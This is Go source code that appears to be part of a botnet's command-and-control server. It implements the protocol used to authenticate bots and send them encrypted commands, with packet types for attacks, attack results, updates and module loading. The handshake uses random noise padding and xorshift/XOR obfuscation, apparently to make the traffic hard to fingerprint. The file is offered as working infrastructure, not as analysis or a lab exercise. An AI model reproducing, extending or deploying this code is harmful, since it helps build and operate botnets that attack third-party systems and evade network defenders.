package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"io"
	"net"
	"sync"
)

const ProtoKeyLen = 32
const ProtoMagicBot = 0x4E50

const (
	ChallengeLen  = 32
	ResponseLen   = 32
	SessionKeyLen = 32
	NoiseMax      = 64

	PktTypeAttack     = 0
	PktTypeUpdate     = 1
	PktTypeUpdateDone = 2
	PktTypePing       = 3
	PktTypePong       = 4
	PktTypeModule     = 5
	PktTypeModuleDone = 6
	PktTypeModuleList = 7
	PktTypeVersionWarn = 8
	PktTypeAttackResult = 9
	PktTypeModuleUnload = 10

	UpdateChunkSize = 4096

	AckOK   = 0x01
	AckFail = 0x00

	ProtoVer     = 1
	BitmEncrypt  = 1 << 4
	BitmCompress = 1 << 5

	BitmDefault = ProtoVer | BitmEncrypt
)

type HandshakeCtx struct {
	Challenge   [ChallengeLen]byte
	SessionKey  [SessionKeyLen]byte
	NoiseSkip   uint8
	Valid       bool
}

var protoKey []byte
var protoOnce sync.Once

func protoInit(keyHex string) {
	protoOnce.Do(func() {
		if keyHex == "" {
			return
		}
		key, err := hex.DecodeString(keyHex)
		if err != nil || len(key) < ProtoKeyLen {
			return
		}
		protoKey = make([]byte, ProtoKeyLen)
		copy(protoKey, key)
	})
}

func protoDecrypt(buf []byte) {
	if len(protoKey) == 0 {
		return
	}
	for i := range buf {
		buf[i] ^= protoKey[i%ProtoKeyLen]
	}
}

func protoReady() bool {
	return len(protoKey) > 0
}

// polymorphic protocol functions

func xorshift64(state *uint64) uint64 {
	x := *state
	x ^= x << 13
	x ^= x >> 7
	x ^= x << 17
	*state = x
	return x
}

func xorshiftBuf(buf []byte, key []byte) {
	var state uint64
	for i := 0; i < 8 && i < len(key); i++ {
		state = (state << 8) | uint64(key[i])
	}
	for i := range buf {
		if i%8 == 0 {
			state = xorshift64(&state)
		}
		buf[i] ^= byte(state >> ((i % 8) * 8))
	}
}

func sessionKeyFromChallenge(challenge []byte, secret []byte) []byte {
	key := make([]byte, SessionKeyLen)
	for i := 0; i < ChallengeLen; i++ {
		key[i] = challenge[i] ^ secret[i%len(secret)]
	}
	return key
}

func polymorphicHandshake(conn net.Conn, ctx *HandshakeCtx) error {
	// read magic (2 bytes)
	magic := make([]byte, 2)
	if _, err := io.ReadFull(conn, magic); err != nil {
		return err
	}

	// generate noise
	noiseBuf := make([]byte, 1+NoiseMax)
	noiseLen := uint8(0)
	if _, err := rand.Read(noiseBuf[1:]); err == nil {
		noiseLen = noiseBuf[1] % NoiseMax
	}
	noiseBuf[0] = noiseLen

	// generate challenge
	challenge := make([]byte, ChallengeLen)
	if _, err := rand.Read(challenge); err != nil {
		return err
	}
	copy(ctx.Challenge[:], challenge)

	// send: noise_skip(1) + noise(noiseLen) + challenge(32)
	packet := append(noiseBuf[:1], noiseBuf[1:1+noiseLen]...)
	packet = append(packet, challenge...)
	if _, err := conn.Write(packet); err != nil {
		return err
	}

	// read response
	response := make([]byte, ResponseLen)
	if _, err := io.ReadFull(conn, response); err != nil {
		return err
	}

	// verify response
	secret := protoKey
	expected := make([]byte, ResponseLen)
	for i := 0; i < ResponseLen; i++ {
		expected[i] = challenge[i] ^ secret[i%len(secret)]
	}

	for i := 0; i < ResponseLen; i++ {
		if response[i] != expected[i] {
			conn.Write([]byte{AckFail})
			return nil
		}
	}

	// send ack
	conn.Write([]byte{AckOK})

	// derive session key
	sk := sessionKeyFromChallenge(challenge, secret)
	copy(ctx.SessionKey[:], sk)
	ctx.Valid = true
	return nil
}

func polymorphicHandshakeRespond(conn net.Conn, ctx *HandshakeCtx) error {
	// read magic (already done by botHandler before calling this)
	// send noise + challenge
	noiseBuf := make([]byte, NoiseMax)
	noiseLen := uint8(0)
	if _, err := rand.Read(noiseBuf); err == nil {
		noiseLen = noiseBuf[0] % NoiseMax
	}

	challenge := make([]byte, ChallengeLen)
	if _, err := rand.Read(challenge); err != nil {
		return err
	}
	copy(ctx.Challenge[:], challenge)

	packet := []byte{noiseLen}
	packet = append(packet, noiseBuf[:noiseLen]...)
	packet = append(packet, challenge...)
	if _, err := conn.Write(packet); err != nil {
		return err
	}

	// read response
	response := make([]byte, ResponseLen)
	if _, err := io.ReadFull(conn, response); err != nil {
		return err
	}

	// verify
	secret := protoKey
	for i := 0; i < ResponseLen; i++ {
		expected := challenge[i] ^ secret[i%len(secret)]
		if response[i] != expected {
			conn.Write([]byte{AckFail})
			ctx.Valid = false
			return nil
		}
	}

	// ack
	conn.Write([]byte{AckOK})

	// derive session key
	sk := sessionKeyFromChallenge(challenge, secret)
	copy(ctx.SessionKey[:], sk)
	ctx.Valid = true
	return nil
}

func polymorphicSend(conn net.Conn, ctx *HandshakeCtx, pktType uint8, bitmap uint8, payload []byte) (int, error) {
	if !ctx.Valid {
		return 0, nil
	}

	payloadLen := len(payload)
	totalLen := 4 + payloadLen

	// build header: merge caller flags with protocol defaults
	hdr := make([]byte, 4)
	hdr[0] = pktType
	hdr[1] = bitmap | BitmDefault
	binary.BigEndian.PutUint16(hdr[2:], uint16(payloadLen))

	// encrypt header
	xorshiftBuf(hdr, ctx.SessionKey[:])

	// send wire length + encrypted header
	wireLen := make([]byte, 2)
	binary.BigEndian.PutUint16(wireLen, uint16(totalLen))
	if _, err := conn.Write(wireLen); err != nil {
		return 0, err
	}
	if _, err := conn.Write(hdr); err != nil {
		return 0, err
	}

	// encrypt and send payload
	if payloadLen > 0 {
		encPayload := make([]byte, payloadLen)
		copy(encPayload, payload)
		xorshiftBuf(encPayload, ctx.SessionKey[:])
		if _, err := conn.Write(encPayload); err != nil {
			return 0, err
		}
	}

	return totalLen + 2, nil
}

func polymorphicRecvInplace(ctx *HandshakeCtx, buf []byte) (uint8, uint8, []byte, error) {
	if !ctx.Valid || len(buf) < 4 {
		return 0, 0, nil, nil
	}

	// decrypt header (first 4 bytes)
	hdr := make([]byte, 4)
	copy(hdr, buf[:4])
	xorshiftBuf(hdr, ctx.SessionKey[:])

	pktType := hdr[0]
	bitmap := hdr[1]
	payloadLen := int(binary.BigEndian.Uint16(hdr[2:]))

	if payloadLen > len(buf)-4 {
		return 0, 0, nil, nil
	}

	// decrypt payload in place
	if payloadLen > 0 {
		xorshiftBuf(buf[4:4+payloadLen], ctx.SessionKey[:])
	}

	// return payload slice
	return pktType, bitmap, buf[4 : 4+payloadLen], nil
}
